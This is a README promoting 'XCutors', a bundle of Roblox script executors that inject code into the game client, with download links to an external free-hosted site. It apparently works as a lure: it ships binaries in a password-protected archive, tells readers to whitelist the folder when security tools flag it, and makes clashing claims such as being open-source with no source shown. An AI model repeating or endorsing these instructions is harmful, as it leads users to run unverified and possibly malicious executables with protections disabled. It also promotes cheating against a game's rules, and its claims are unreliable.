# **XCutors – Roblox Script Executors**

**Run Lua scripts and enhance your Roblox experience**

XCutors is a powerful collection of script executors designed for Roblox players who want to customize their gameplay, automate tasks, and unlock new features. With support for popular executors like Volt, Synapse Z, Potassium, Wave, and our own universal loader, XCutors provides a reliable and user-friendly solution for running Lua scripts in any Roblox game.

[![Website](https://img.shields.io/badge/Website-xcutors.gamer.gd-blueviolet?style=for-the-badge&logo=google-chrome)](https://xcutors.gamer.gd) [![Download](https://img.shields.io/badge/Download-Latest_Cyan?style=for-the-badge&logo=windows)](https://xcutors.gamer.gd)

## Features

- Bundles five popular executors: Volt, Synapse Z, Potassium, Wave, and xcutorsLoader
- Universal xcutorsLoader supports dynamic executor switching at runtime
- Intuitive Windows desktop GUI for browsing, selecting, and launching executors
- Built-in Lua script editor with syntax highlighting and auto-completion
- One-click script injection with configurable keybind shortcuts
- Persistent per-game profile storage for remembering your preferred executor and scripts
- Automatic update checker keeps every bundled executor on its latest version
- Lightweight background service with minimal CPU and RAM footprint
- Detailed execution logs and error reporting for easy troubleshooting
- Fully portable mode — run entirely from a USB drive with zero installation

## System Requirements

- Windows 10 or later (64-bit)
- 2 GB RAM minimum (1 GB may work but not guaranteed)
- 200 MB free disk space
- Internet connection for updates and script downloads
- Microsoft Visual C++ Redistributable (latest version recommended)
- Roblox client installed and updated

## How to Install

1. Download the executor you like from the Our Loaders section, or grab the universal loader above.
2. You will receive an archive file (ZIP or RAR).
3. Extract the archive using the password below: `xcutors`.
4. Run the extracted executable and follow the on-screen instructions.
5. Launch Roblox, inject the executor, and enjoy!

## Screenshots

[![Website Preview](https://i.ibb.co/hxcqWR61/site-Prev.png)](https://xcutors.gamer.gd)
[![Available Executors](https://i.ibb.co/LXXDC1bd/our-Loaders.png)](https://xcutors.gamer.gd)

## FAQ

### Is XCutors free to use?

Yes. XCutors and the xcutorsLoader are completely free and open-source. Individual bundled executors are subject to their own licensing terms.

### Which Windows versions are supported?

XCutors officially supports Windows 10 (version 1903 and later) and Windows 11 on both x64 and ARM64 architectures.

### Do I need to install each executor separately?

No. The universal xcutorsLoader handles downloading and updating every bundled executor automatically after you select one for the first time.

### Can I add my own executors to the collection?

Absolutely. Place a compatible executor binary in the Executors\custom folder and add a matching JSON descriptor. The loader will detect it on the next refresh.

### Does XCutors run in the background?

Only the lightweight update-checker service runs in the background by default. You can disable it entirely from Settings → General → Background Services.

### My anticomponent flags a file — what should I do?

Some security tools flag executor binaries due to their DLL-injection mechanism. This is a known false-positive pattern. You can whitelist the XCutors folder or review the source code yourself for peace of mind.

### How do I report a bug or request a feature?

Open an Issue on this GitHub repository using the provided templates. Include your Windows version, XCutors version, and reproduction steps for the fastest response.

### Will XCutors work on macOS or Linux?

Currently XCutors is Windows-only. Cross-platform support is on our roadmap, but no concrete release date has been announced yet.

### How do I uninstall XCutors?

Simply delete the extracted folder and remove any scheduled tasks named XCutorsUpdate. No system-wide registry entries are created by default.

## Download

[![Download Now](https://img.shields.io/badge/Download-All_Executors-cyan?style=for-the-badge&logo=windows)](https://xcutors.gamer.gd)

## Disclaimer

This project is for educational purposes only. Use at your own risk. The developers are not responsible for any account restrictions or damages resulting from the use of this software.